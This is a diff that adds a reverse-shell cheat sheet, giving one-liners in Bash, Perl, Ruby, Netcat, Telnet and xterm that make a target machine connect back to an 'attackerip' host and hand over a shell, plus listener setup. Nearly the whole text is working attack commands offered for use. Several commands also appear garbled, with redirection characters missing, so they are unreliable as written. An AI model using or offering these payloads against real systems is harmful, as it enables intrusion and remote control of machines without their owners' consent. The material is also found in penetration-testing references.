@@ -1,0 +1,97 @@
+First of all, on your machine, set up a listener, where attackerip is your IP address and 4444 is an arbitrary TCP port unfiltered by the target's firewall:
+
+    attacker$ nc -l -v attackerip 4444
+
+
+Bash
+
+Alternatives for Bash shell:
+
+    exec /bin/bash 0&0 2>&0
+
+Or:
+
+    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+
+Or:
+
+    exec 5<>/dev/tcp/attackerip/4444
+    cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
+    while read line 0<&5; do $line 2>&5 >&5; done
+
+See also Reverse Shell With Bash from GNUCITIZEN blog.
+
+Perl
+
+Shorter Perl reverse shell that does not depend on /bin/sh:
+
+    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+If the target system is running Windows use the following one-liner:
+
+    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+Ruby
+
+Longer Ruby reverse shell that does not depend on /bin/sh:
+
+    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+If the target system is running Windows use the following one-liner:
+
+    ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+Netcat
+
+Others possible Netcat reverse shells, depending on the Netcat version and compilation flags:
+
+    nc -c /bin/sh attackerip 4444
+
+Or:
+
+    /bin/sh | nc attackerip 4444
+
+Or:
+
+    rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
+
+
+See also 7 Linux Shells Using Built-in Tools from LaNMaSteR53 blog.
+
+Telnet
+
+Of course, you can also use Telnet as an alternative for Netcat:
+
+    rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+
+Or:
+
+    telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
+
+xterm
+
+Follows further details on xterm reverse shell:
+
+To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001). One way to do this is with Xnest:
+
+    Xnest :1
+
+Then remember to authorise on your system the target IP to connect to you:
+
+    xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
+    xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server
+
+Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
+
+    xterm -display attackerip:1
+
+Or:
+
+    $ DISPLAY=attackerip:0 xterm
+
+It will try to connect back to you, attackerip, on TCP port 6001.
+
+Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:
+
+    /usr/openwin/bin/xterm -display attackerip:1
+
